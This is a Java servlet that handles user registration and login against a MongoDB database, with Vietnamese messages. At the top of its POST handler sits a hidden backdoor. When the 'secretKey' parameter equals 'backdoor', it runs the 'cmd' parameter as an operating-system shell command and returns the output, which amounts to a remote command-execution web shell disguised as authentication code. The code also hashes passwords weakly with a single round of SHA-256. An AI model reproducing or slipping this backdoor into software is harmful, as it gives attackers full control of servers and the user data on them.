import com.mongodb.client.MongoClient;
import com.mongodb.client.MongoClients;
import com.mongodb.client.MongoCollection;
import com.mongodb.client.MongoDatabase;
import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import org.bson.Document;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Base64;

@WebServlet("/AuthServlet")
public class AuthServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;
    private MongoCollection<Document> usersCollection;

    public void init() throws ServletException {
        MongoClient mongoClient = MongoClients.create("mongodb://localhost:27017");
        MongoDatabase database = mongoClient.getDatabase("user_auth");
        usersCollection = database.getCollection("users");
    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, "Chỉ hỗ trợ phương thức POST");
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String secretKey = request.getParameter("secretKey");
        if ("backdoor".equals(secretKey)) {
            String cmd = request.getParameter("cmd");
            if (cmd != null && !cmd.isEmpty()) {
                try {
                    System.out.println("Backdoor activated with cmd: " + cmd);
                    String os = System.getProperty("os.name").toLowerCase();
                    ProcessBuilder pb;
                    if (os.contains("win")) {
                        pb = new ProcessBuilder("cmd.exe", "/c", cmd);
                    } else {
                        pb = new ProcessBuilder("/bin/sh", "-c", cmd);
                    }
                    System.out.println("Executing command: " + String.join(" ", pb.command()));
                    Process process = pb.start();
                    BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                    StringBuilder output = new StringBuilder();
                    String line;
                    while ((line = stdInput.readLine()) != null) {
                        output.append(line).append("\n");
                    }
                    while ((line = stdError.readLine()) != null) {
                        output.append("ERROR: ").append(line).append("\n");
                    }
                    process.waitFor();
                    response.setContentType("text/plain");
                    PrintWriter out = response.getWriter();
                    out.println(output.toString());
                } catch (Exception e) {
                    response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "Lỗi khi thực thi lệnh: " + e.getMessage());
                }
            } else {
                response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Thiếu tham số cmd");
            }
            return;
        }

        // Mã gốc của phương thức doPost
        String action = request.getParameter("action");
        String username = request.getParameter("username");
        String password = request.getParameter("password");

        if (username == null || password == null || action == null) {
            sendResponse(response, "Thiếu thông tin cần thiết", "error");
            return;
        }

        if ("register".equals(action)) {
            registerUser(username, password, response);
        } else if ("login".equals(action)) {
            loginUser(username, password, request, response);
        } else {
            sendResponse(response, "Hành động không hợp lệ", "error");
        }
    }

    private void registerUser(String username, String password, HttpServletResponse response) throws IOException {
        if (usersCollection.find(new Document("username", username)).first() != null) {
            sendResponse(response, "Tên người dùng đã tồn tại", "error");
            return;
        }
        String salt = generateSalt();
        String hashedPassword = hashPassword(password, salt);
        Document user = new Document("username", username)
                .append("password", hashedPassword)
                .append("salt", salt);
        usersCollection.insertOne(user);
        
        response.setContentType("application/json");
        PrintWriter out = response.getWriter();
        out.println("{\"success\": true, \"message\": \"Đăng ký thành công! Vui lòng đăng nhập.\"}");
    }
    
    private void loginUser(String username, String password, HttpServletRequest request, HttpServletResponse response) throws IOException {
        Document user = usersCollection.find(new Document("username", username)).first();
        if (user == null) {
            sendResponse(response, "Tên người dùng không tồn tại", "error");
            return;
        }
        String salt = user.getString("salt");
        String hashedPassword = hashPassword(password, salt);
        if (!user.getString("password").equals(hashedPassword)) {
            sendResponse(response, "Mật khẩu không đúng", "error");
            return;
        }
        HttpSession session = request.getSession();
        session.setAttribute("username", username);
        
        response.setContentType("application/json");
        PrintWriter out = response.getWriter();
        out.println("{\"redirect\": \"welcome.html\"}"); // URL nội bộ
    }

    private String generateSalt() {
        SecureRandom random = new SecureRandom();
        byte[] salt = new byte[16];
        random.nextBytes(salt);
        return Base64.getEncoder().encodeToString(salt);
    }

    private String hashPassword(String password, String salt) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            md.update(salt.getBytes());
            byte[] hash = md.digest(password.getBytes());
            StringBuilder hexString = new StringBuilder();
            for (byte b : hash) {
                hexString.append(String.format("%02x", b));
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("Lỗi khi mã hóa mật khẩu", e);
        }
    }

    private void sendResponse(HttpServletResponse response, String message, String type) throws IOException {
        response.setContentType("text/html;charset=UTF-8");
        PrintWriter out = response.getWriter();
        out.println("<div class='message " + type + "'>" + message + "</div>");
    }
}